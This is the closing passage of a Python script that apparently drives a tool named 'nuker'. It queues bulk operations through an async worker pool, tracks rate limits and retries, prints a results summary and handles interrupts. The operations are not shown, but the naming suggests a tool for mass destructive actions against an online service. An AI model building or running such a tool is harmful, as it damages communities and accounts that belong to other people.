                return

            if total == 0:
                return

            try:
                _safe_print("")
                _safe_print(
                    f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}QUEUE{RESET} "
                    f"{PURPLE}─────────────────────────────────────────────────┐{RESET}"
                )
                _safe_print(
                    f"{PURPLE}│{RESET} Total operations queued: {LIME}{BOLD}{total}{RESET}"
                )
                _safe_print(
                    f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
                )
            except Exception:
                pass

            pool = WorkerPool(nuker)
            try:
                await pool.start()
            except Exception:
                pass

            try:
                reporter = asyncio.create_task(progress_reporter(total))
            except Exception:
                reporter = None

            try:
                autotune_task = asyncio.create_task(pool.autotune())
            except Exception:
                autotune_task = None

            try:
                await nuker.queue.join()
            except Exception:
                pass
            finally:
                try:
                    stop_event.set()
                except Exception:
                    pass
                try:
                    if autotune_task:
                        autotune_task.cancel()
                except Exception:
                    pass
                try:
                    if reporter:
                        reporter.cancel()
                except Exception:
                    pass
                try:
                    await pool.stop()
                except Exception:
                    pass
                try:
                    gather_list = [t for t in [autotune_task, reporter] if t]
                    if gather_list:
                        await asyncio.gather(*gather_list, return_exceptions=True)
                except Exception:
                    pass
                try:
                    for t in list(_pending_tasks):
                        t.cancel()
                except Exception:
                    pass
                try:
                    if _pending_tasks:
                        await asyncio.gather(
                            *list(_pending_tasks), return_exceptions=True
                        )
                except Exception:
                    pass
                try:
                    _safe_print("")
                except Exception:
                    pass

            try:
                _safe_print("")
                elapsed = time.time() - stats["start_time"]
                done = stats["done"]
                already = stats["already"]
                failed = stats["failed"]
                retries = stats["retries"]
                rl = stats["rate_limits"]

                _safe_print(
                    f"{PURPLE}┌─ {BRIGHT_MAGENTA}{BOLD}FINAL RESULTS{RESET} "
                    f"{PURPLE}────────────────────────────────────────┐{RESET}"
                )
                _safe_print(
                    f"{PURPLE}│{RESET} {BRIGHT_GREEN}✔  Success   {RESET}: {BOLD}{done}/{total}{RESET}"
                )
                _safe_print(
                    f"{PURPLE}│{RESET} {GRAY}↷  Skipped   {RESET}: {BOLD}{already}{RESET}"
                )
                _safe_print(
                    f"{PURPLE}│{RESET} {BRIGHT_RED}✘  Failed    {RESET}: {BOLD}{failed}{RESET}"
                )
                _safe_print(
                    f"{PURPLE}│{RESET} {BRIGHT_YELLOW}↻  Retries   {RESET}: {BOLD}{retries}{RESET}"
                )
                _safe_print(
                    f"{PURPLE}│{RESET} {LIME}⏱  Rate Lmt  {RESET}: {BOLD}{rl}{RESET}"
                )
                _safe_print(
                    f"{PURPLE}│{RESET} {LIME}⏲  Time      {RESET}: {BOLD}{elapsed:.2f}s{RESET}"
                )
                _safe_print(
                    f"{PURPLE}│{RESET} {PINK}⚡  Avg Rate  {RESET}: "
                    f"{BOLD}{_safe_div(done, max(elapsed, 0.01), 0):.1f}/s{RESET}"
                )
                _safe_print(
                    f"{PURPLE}└──────────────────────────────────────────────────────────┘{RESET}"
                )
            except Exception:
                pass
    except Exception:
        return


def _signal_handler(sig, frame):
    global _interrupted
    try:
        if _interrupted:
            try:
                _safe_print(f"\n{BRIGHT_RED}⚠ Force exit.{RESET}")
            except Exception:
                pass
            try:
                os._exit(1)
            except Exception:
                pass
        _interrupted = True
        try:
            _safe_print(f"\n{BRIGHT_YELLOW}⚠ Interrupted — shutting down...{RESET}")
        except Exception:
            pass
        if stop_event is None:
            return
        try:
            loop = asyncio.get_running_loop()
            loop.call_soon_threadsafe(stop_event.set)
        except RuntimeError:
            pass
        except Exception:
            pass
    except Exception:
        try:
            os._exit(1)
        except Exception:
            pass


def _run_main():
    try:
        try:
            asyncio.get_running_loop()
            return 1
        except RuntimeError:
            pass
        asyncio.run(main())
        return 0
    except KeyboardInterrupt:
        return 130
    except RuntimeError:
        return 1
    except Exception:
        return 1


if __name__ == "__main__":
    try:
        signal.signal(signal.SIGINT, _signal_handler)
    except (ValueError, OSError, AttributeError):
        pass
    except Exception:
        pass
    try:
        sys.exit(_run_main())
    except SystemExit:
        raise
    except Exception:
        pass